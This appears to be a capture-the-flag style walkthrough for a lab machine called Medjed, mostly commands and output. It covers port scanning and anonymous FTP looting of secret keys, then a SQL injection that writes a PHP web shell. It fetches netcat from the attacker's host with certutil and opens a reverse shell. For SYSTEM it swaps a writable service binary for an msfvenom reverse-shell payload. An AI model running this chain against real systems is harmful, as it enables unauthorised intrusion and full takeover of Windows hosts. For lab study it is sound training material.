@@ -1,0 +1,232 @@
+																			                        Medjed Walkthrough
+																			
+																								
+Attacker's Machine: 192.168.45.186
+Victim's Machine: 192.168.156.127
+export IP=192.168.156.127
+
+./nmapAutomator.sh -H $IP -t Full
+
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   NULL: 
+|_    Host '192.168.45.189' is not allowed to connect to this MariaDB server
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8000/tcp  open  http-alt      BarracudaServer.com (Windows)
+30021/tcp open  ftp           FileZilla ftpd 0.9.41 beta
+|_ftp-bounce: bounce working!
+33033/tcp open  unknown
+44330/tcp open  ssl/unknown
+| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US
+45332/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+|_http-title: Quiz App
+45443/tcp open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
+|_http-title: Quiz App
+
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Enumeration
+139,445
+
+enum4linux -a $IP                  # nothing usefull
+
+8000
+8000/tcp  open  http-alt      BarracudaServer.com (Windows)
+
+# When you access the web application Barracuda on port 8000, you are met with a prompt asking set an administrator account.
+
+urs
+123456
+
+# Checking the About button on the right side, we see that we are dealing with BarracudaDrive 6.5
+
+
+33033
+
+http://192.168.160.127:33033/  -UserProMedjed Web application
+http://192.168.160.127:33033/login - Login page
+
+# additional usefull information that might be usefull later on?
+
+evren.eagan@company.com
+joe.webb@company.com
+jerren.devops@company.com
+kenneth.dooley@company.com
+laura.lauer@company.com
+christopher@company.com
+
+45332 
+gobuster dir -u http://$IP:45332 -w /usr/share/wordlists/dirb/common.txt
+/phpinfo.php          (Status: 200) [Size: 90796]     
+
+45443     
+gobuster dir -u http://$IP:45443 -w /usr/share/wordlists/dirb/common.txt
+/phpinfo.php          (Status: 200) [Size: 90796]
+
+30021      FileZilla ftpd 0.9.41 beta
+
+# Let's download the files and check if we have anything usefull
+
+wget -m --no-passive ftp://anonymous:anonymous@$IP:21
+
+cat config/secrets.yml
+api_key: a1B2c3D4e5F6
+development:
+  secret_key_base: 36c569c923cac0e10cddd6588b468d09e82eb8a3a25cee7274f1a6680fb0cb19f6c1a64cad5c57923aa4b89675315c9202a5ff8db67f84a150668d6949cc0846
+
+test:
+  secret_key_base: be9463a08fe11dd60d1ff4bd361392f994f5365445b6685b86ac65fa08d1a2c8772068af773f31b758475849117a231dc51ac60f3a937539ceff9dc3a3668c48
+  
+# Let's go back to out web application and see if you find any public exploits
+
+searchsploit BarracudaDrive 6.5
+
+BarracudaDrive v6.5 - Insecure Folder Permissions                                                                                  | windows/local/48789.txt
+
+# this seems an exploit that will allow us to escalate privilege from local-user to SYSTEM, so we will need this most likely after we get a foothold on the machine
+
+# Let's go through the BarracudaDrive application, see if we get anything out of it. Navigate to the Web-File-Server top right and notice that we have a file server link.
+
+
+
+
+# If you click on the search feature, you can search through the entire file system.
+
+
+
+
+
+# Double click on any path and then you can basically manually navigate through the entire PC and read both flags if you want, including the local.txt and proof.txt. But since most likely was not intented for OSCP, let's go though the regulat exploitation.
+
+# Let's go back to 45332 
+
+/phpinfo.php          (Status: 200) [Size: 90796] 
+
+# Checking out phpinfo we notice that we have a user jerren on the system and that the document root is in C:/xampp/htdocs. Since we have a username, and we know we had a login page in port 33033, let's try to see if we can get access to the app.  
+
+# Let's try to access a non existing resource on the server to see how to server reponds.
+
+http://192.168.217.127:33033/test
+
+
+
+# WE notice some interesting endpoints that we might access. Login, logout do not look very interesting, let's see what /slug endpoint has.
+
+http://192.168.217.127:33033/slug
+
+
+
+# Let's try some input and see where this takes us. Using some random input, we see in our URL that out input is done through a the URL parameter 
+
+http://192.168.217.127:33033/slug?URL=1
+
+# Let's test for sql injection.
+
+http://192.168.217.127:33033/slug?URL='
+
+
+
+# We've basically confirmed that we have SQL injection. Since we know that our root directory is C:/xampp/htdocs, let's try to create a file containing a vulnerable parameter that give us code execution. 
+  However, notice the sql syntax, + params[:URL].to_s + is wrapped in two different quotation marks (" , '). Meaning that even is we try to comment our injection, we still need to close our second ' within our query.
+  
+  Let's create a new php file within our root document containing a vulnerable cmd parameter.
+  
+  ' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile 'C:/xampp/htdocs/urs.php' -- -     
+  
+                
+   
+# Now that we've performed out action without any errors, let's try to access our file on each web server available, since we don't know exactly where these changes will take effect.
+ 
+http://192.168.217.127:45332/urs.php
+http://192.168.217.127:45443/urs.php
+
+
+# It seems that both application contain our php file. So let's try to obtain our reverse shell.
+
+http://192.168.217.127:45443/urs.php?cmd=whoami
+medjed\jerren medjed\jerren
+
+# Upload netcat on the victims PC
+
+certutil.exe -urlcache -split -f http://192.168.45.151:80/nc64.exe C:/xampp/htdocs/nc64.exe
+
+http://192.168.217.127:33033/slug?URL=certutil.exe+-urlcache+-split+-f+http%3A%2F%2F192.168.45.151%3A80%2Fnc64.exe+C%3A%2Fxampp%2Fhtdocs%2Fnc64.exe
+
+http://192.168.217.127:45443/urs.php?cmd=nc64.exe 192.168.45.151 4444 -e cmd.exe
+
+rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.151] from (UNKNOWN) [192.168.217.127] 50494
+Microsoft Windows [Version 10.0.19042.1387]
+(c) Microsoft Corporation. All rights reserved.
+
+cd C:\Users\Jerren\Desktop
+more local.txt
+18312a2bd9962dd1dc7856a6f2b66e1f
+
+
+
+
+Privilege escalation
+
+# Remember that there was a public exploit for barracudaDrive? I didn't managed to compile the binary from the exploit, so let's see if we find anything usefull on the machine.
+
+# Let's run PrivescCheck.ps1 on the machine
+
+Import-Module .\PrivescCheck.ps1
+Invoke-PrivescCheck
+
+Name        : bd
+DisplayName : BarracudaDrive ( bd ) service
+ImagePath   : "C:\bd\bd.exe"
+User        : LocalSystem
+StartMode   : Automatic
+
+
+
+
+# Manually search for non standard services
+
+Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike "C:\Windows*" } | select Name,DisplayName,StartMode,PathName
+
+Name                          DisplayName                                                      StartMode PathName      
+----                          -----------                                                      --------- --------      
+bd                            BarracudaDrive ( bd ) service                                    Auto      "C:\bd\bd.exe"
+edgeupdate               Microsoft Edge Update Service (edgeupdate)               Auto      "C:\Program...
+edgeupdatem            Microsoft Edge Update Service (edgeupdatem)            Manual    "C:\Program..
+
+# Let's check our permissions on the binary and folder
+
+
+
+
+
+# Since we have rights, let's try to make a backup of the binary and replace it our own reverse shell binary and restart the system since start mode is set to auto.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.179 LPORT=2222 -f exe > shell64.exe
+
+cd C:\bd
+move bd.exe bd.backup.exe
+certutil.exe -urlcache -split -f http://192.168.45.179:80/shell64.exe bd.exe
+
+# Restart the system and have a listener opened
+shutdown /r /t 0 /f
+
+rlwrap nc -lvnp 2222                             
+listening on [any] 2222 ...
+connect to [192.168.45.179] from (UNKNOWN) [192.168.156.127] 49669
+Microsoft Windows [Version 10.0.19042.1387]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+nt authority\system
+
+cd C:\Users\Administrator\Desktop
+more proof.txt
+2e42628b7d0191c6ef4fc4b2102eb008
